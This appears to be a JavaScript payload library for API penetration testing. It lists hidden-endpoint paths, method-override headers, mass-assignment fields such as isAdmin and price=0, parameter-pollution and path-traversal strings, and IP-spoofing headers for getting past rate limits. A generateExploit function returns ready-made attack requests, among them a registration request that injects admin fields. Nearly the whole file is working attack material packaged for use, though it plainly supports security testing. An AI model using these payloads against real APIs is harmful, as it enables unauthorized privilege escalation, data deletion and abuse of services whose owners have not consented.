// API Testing Vulnerability Payloads
// Comprehensive payload database for API security testing

const APIPayloads = {
    // Hidden endpoint discovery
    hiddenEndpoints: [
        { path: '/api/admin', description: 'Admin API endpoint' },
        { path: '/api/v1/internal', description: 'Internal API' },
        { path: '/api/debug', description: 'Debug endpoint' },
        { path: '/api/config', description: 'Configuration endpoint' },
        { path: '/api/swagger', description: 'Swagger documentation' },
        { path: '/api/docs', description: 'API documentation' },
        { path: '/api/graphql', description: 'GraphQL endpoint' },
        { path: '/api/users/all', description: 'All users endpoint' },
        { path: '/_api/', description: 'Hidden API prefix' },
        { path: '/api/private', description: 'Private API' }
    ],

    // HTTP method override
    methodOverride: [
        { method: 'PATCH', description: 'Update partial resource' },
        { method: 'PUT', description: 'Replace resource' },
        { method: 'DELETE', description: 'Delete resource' },
        { method: 'OPTIONS', description: 'Discover allowed methods' },
        { method: 'TRACE', description: 'Debug/trace request' },
        { header: 'X-HTTP-Method-Override: DELETE', description: 'Method override header' },
        { header: 'X-Method-Override: PUT', description: 'Alternative override header' }
    ],

    // Mass assignment / Parameter pollution
    massAssignment: [
        { param: 'isAdmin', value: 'true', description: 'Admin flag injection' },
        { param: 'role', value: 'admin', description: 'Role parameter' },
        { param: 'admin', value: '1', description: 'Admin boolean' },
        { param: 'user_type', value: 'administrator', description: 'User type override' },
        { param: 'status', value: 'active', description: 'Status manipulation' },
        { param: 'verified', value: 'true', description: 'Bypass verification' },
        { param: 'price', value: '0', description: 'Price manipulation' },
        { param: 'discount', value: '100', description: 'Full discount' }
    ],

    // Server-side parameter pollution
    serverSideParamPollution: [
        { payload: 'param=value%26admin=true', description: 'Encoded ampersand injection' },
        { payload: 'param=value&param=override', description: 'Duplicate parameter' },
        { payload: 'user=test%23admin=true', description: 'Hash/fragment injection' },
        { payload: 'path/../admin', description: 'Path traversal in param' }
    ],

    // API versioning attacks
    versioningAttacks: [
        { path: '/api/v1/', description: 'Version 1 (may be deprecated)' },
        { path: '/api/v2/', description: 'Version 2' },
        { path: '/api/v3/', description: 'Version 3 (may be beta)' },
        { header: 'Accept-Version: 1.0', description: 'Version header' },
        { header: 'API-Version: 1', description: 'API version header' },
        { header: 'X-API-Version: beta', description: 'Beta API version' }
    ],

    // Content-type manipulation
    contentTypeManipulation: [
        { type: 'application/json', description: 'JSON content type' },
        { type: 'application/xml', description: 'XML (may trigger XXE)' },
        { type: 'text/xml', description: 'Text XML' },
        { type: 'application/x-www-form-urlencoded', description: 'Form encoded' },
        { type: 'multipart/form-data', description: 'Multipart form' }
    ],

    // Rate limiting bypass
    rateLimitBypass: [
        { header: 'X-Forwarded-For: 127.0.0.1', description: 'Spoof local IP' },
        { header: 'X-Original-URL: /different-path', description: 'URL override' },
        { header: 'X-Forwarded-Host: localhost', description: 'Host override' },
        { technique: 'array-params', description: 'Send params as array' }
    ],

    // Common API endpoints
    commonEndpoints: [
        '/api/users', '/api/user', '/api/account',
        '/api/profile', '/api/settings', '/api/admin',
        '/api/login', '/api/register', '/api/password',
        '/api/token', '/api/refresh', '/api/logout'
    ]
};

// Test types
const APITests = {
    hidden: {
        name: 'Hidden Endpoints',
        description: 'Discover undocumented API endpoints',
        severity: 'MEDIUM'
    },
    method: {
        name: 'Method Override',
        description: 'Test HTTP method manipulation',
        severity: 'HIGH'
    },
    mass: {
        name: 'Mass Assignment',
        description: 'Inject unauthorized parameters',
        severity: 'HIGH'
    },
    pollution: {
        name: 'Parameter Pollution',
        description: 'Server-side param pollution',
        severity: 'HIGH'
    },
    version: {
        name: 'API Versioning',
        description: 'Access deprecated/beta APIs',
        severity: 'MEDIUM'
    },
    content: {
        name: 'Content-Type',
        description: 'Content-type manipulation',
        severity: 'MEDIUM'
    }
};

// Helper functions
function getHiddenEndpointPayloads() {
    return APIPayloads.hiddenEndpoints;
}

function getMethodOverridePayloads() {
    return APIPayloads.methodOverride;
}

function getMassAssignmentPayloads() {
    return APIPayloads.massAssignment;
}

function getParamPollutionPayloads() {
    return APIPayloads.serverSideParamPollution;
}

function getVersioningPayloads() {
    return APIPayloads.versioningAttacks;
}

function getPayloadCount() {
    return APIPayloads.hiddenEndpoints.length +
        APIPayloads.methodOverride.length +
        APIPayloads.massAssignment.length +
        APIPayloads.serverSideParamPollution.length +
        APIPayloads.versioningAttacks.length +
        APIPayloads.contentTypeManipulation.length;
}

function generateExploit(type) {
    switch (type) {
        case 'hidden':
            return `# Hidden API Endpoint Discovery

# Common hidden endpoints to check:
GET /api/admin HTTP/1.1
GET /api/v1/internal HTTP/1.1
GET /api/debug HTTP/1.1
GET /api/swagger.json HTTP/1.1
GET /api/docs HTTP/1.1
GET /_api/users HTTP/1.1

# Check documentation endpoints:
GET /swagger/index.html HTTP/1.1
GET /api-docs HTTP/1.1
GET /openapi.json HTTP/1.1

# Version discovery:
GET /api/v1/users HTTP/1.1
GET /api/v2/users HTTP/1.1
GET /api/beta/users HTTP/1.1

# Burp Intruder wordlist for API paths:
/api/FUZZ
/v1/FUZZ
/internal/FUZZ`;

        case 'mass':
            return `# Mass Assignment Attack

# Original request (user registration):
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123"
}

# Exploit - add hidden parameters:
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "isAdmin": true,
  "role": "admin",
  "verified": true
}

# Try different parameter names:
- admin, is_admin, isAdmin, administrator
- role, user_role, userRole, access_level
- verified, email_verified, is_verified`;

        case 'pollution':
            return `# Server-Side Parameter Pollution

# Encoded ampersand injection:
POST /api/update HTTP/1.1

name=test%26admin=true

# Server parses as: name=test&admin=true

# Duplicate parameters:
GET /api/user?role=user&role=admin

# Different servers handle differently:
# - PHP: Last value wins (admin)
# - ASP.NET: First value wins (user)
# - Express: Array ['user', 'admin']

# Path injection:
GET /api/users/../../admin/config

# Hash/fragment injection:
GET /api/user?id=1%23admin=true`;

        case 'method':
            return `# HTTP Method Override Attack

# Try different methods on endpoints:
DELETE /api/users/1 HTTP/1.1
PUT /api/users/1 HTTP/1.1
PATCH /api/users/1 HTTP/1.1

# Method override via headers:
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE

POST /api/users/1 HTTP/1.1
X-Method-Override: PUT

# Query parameter override:
POST /api/users/1?_method=DELETE HTTP/1.1

# Check allowed methods:
OPTIONS /api/users HTTP/1.1
# Response: Allow: GET, POST, PUT, DELETE`;

        default:
            return '';
    }
}

// Generate curl command
function generateCurlCommand(endpoint, method, headers, body) {
    let cmd = `curl -X ${method} '${endpoint}'`;
    if (headers) {
        headers.forEach(h => {
            cmd += ` \\\n  -H '${h}'`;
        });
    }
    if (body) {
        cmd += ` \\\n  -d '${JSON.stringify(body)}'`;
    }
    return cmd;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        APIPayloads,
        APITests,
        getHiddenEndpointPayloads,
        getMethodOverridePayloads,
        getMassAssignmentPayloads,
        getParamPollutionPayloads,
        getVersioningPayloads,
        getPayloadCount,
        generateExploit,
        generateCurlCommand
    };
}
